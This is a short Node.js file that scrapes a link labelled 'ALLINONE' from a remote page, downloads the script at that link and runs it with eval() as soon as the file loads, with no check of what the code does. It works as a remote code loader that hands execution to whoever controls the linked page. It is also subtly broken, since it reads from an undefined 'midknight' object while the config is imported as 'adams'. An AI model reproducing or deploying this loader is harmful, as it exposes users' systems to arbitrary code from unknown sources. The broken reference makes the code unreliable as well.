
const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchALLINONEUrl() {
  try {
    const response = await axios.get(midknight.MIARA);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("ALLINONE")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('ALLINONE not found 😭');
    }

    console.log('ALLINONE loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchALLINONEUrl();
